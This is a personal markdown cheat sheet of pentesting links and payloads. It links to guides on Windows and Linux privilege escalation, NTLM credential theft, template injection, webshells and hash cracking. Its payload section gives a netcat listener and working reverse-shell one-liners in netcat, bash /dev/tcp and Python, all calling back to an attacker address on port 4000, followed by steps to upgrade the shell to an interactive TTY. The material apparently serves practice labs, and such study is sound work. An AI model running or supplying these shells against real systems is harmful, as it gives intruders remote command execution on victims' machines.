# Resources
A collection of links and payloads I stored for quick access
# LINKS
## Overviews
- [**Pentesting Map**](https://www.offensity.com/en/blog/just-another-recon-guide-pentesters-and-bug-bounty-hunters/)
- [**Bug Bounty Writeups**](https://hackerone.com/hacktivity)
- [**Bug Bounty Cheatsheat**](https://github.com/EdOverflow/bugbounty-cheatsheet)

## Windows Pentesting
### Microsoft SQL Server 
- [**MSSQL Pentesting**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
- [**Impacket mssqlclient Reverse Shell**](https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/)
### Windows Privillage Escalation
- [**NTLM Theft**](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds)
- [**Windows Local Privillage Escalation**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup)
- [**Windows Local Privillage Escalation Checklist**](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation)
- [**Juicy Potato Exploit**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato)
- [**Pass The Hash**](https://www.netwrix.com/pass_the_hash_attack_explained.html)
## Hash Cracking

- [**HashCat Beginner Guide**](https://resources.infosecinstitute.com/topic/hashcat-tutorial-beginners/)
- [**Hash Analyzer**](https://www.tunnelsup.com/hash-analyzer/)
- [**Zip and rar Cracking with john**](https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html)
## Log4J
- [**Log4j Exploatation**](https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi)
## Payloads
- [**Server SideTemplate Injection Payloads**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [**Jenkins Pentesting**](https://book.hacktricks.xyz/cloud-security/jenkins#code-execution)
- [**Payloads Of All Things**](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [**MSSQL Injection Cheatsheat**](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
- [**XP_cmdshell cheatsheat**](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)

## Linux Privillage Escalation
- [**GTFO bins **](https://gtfobins.github.io/)
- [**LXD Privillage Escalation **]("https://www.hackingarticles.in/lxd-privilege-escalation/")
- [**LXD Exploatation **](https://steflan-security.com/linux-privilege-escalation-exploiting-the-lxc-lxd-groups/)
## Shells
- [**Webshells**](https://github.com/BlackArch/webshells)
- [**Reverse Shell Generator**](https://www.revshells.com/)
- [**NC.EXE**](https://github.com/int0x33/nc.exe/blob/master/nc.exe)
## Tools
- [**SecLists**](https://github.com/danielmiessler/SecLists)
- [**Responder**](https://github.com/SpiderLabs/Responder)
- [**Impacket**](https://github.com/SecureAuthCorp/impacket)
- [**SQL Map**](https://github.com/sqlmapproject/sqlmap)
- [**XSS Strike**](https://github.com/s0md3v/XSStrike)
- [**ffuf**](https://github.com/ffuf/ffuf)
- [**WinPeas**](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [** Rogue JNDI **](https://github.com/veracode-research/rogue-jndi)
# Payloads
## Local Webserver

### Python

```python
python -m SimpleHTTPServer
```

```python
python3 -m http.server
```

### PHP
```php
php -S 0.0.0.0:8000
```

## Shells

### Set Listener 
```bash
nc -lnvp 4000
```

### [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
#### netcat:
```bash
nc -e /bin/sh 10.10.15.22 4000
```

#### Bash
```bash
bash -i >& /dev/tcp/10.10.15.22/4000 0>&1
```
#### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.22",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### Interactive Shell

#### Bash
```python
python(3) -c 'import pty; pty.spawn("/bin/bash")'
```
```cmd
Ctrl-Z
```
```cmd
stty raw -echo
```
```
fg
```
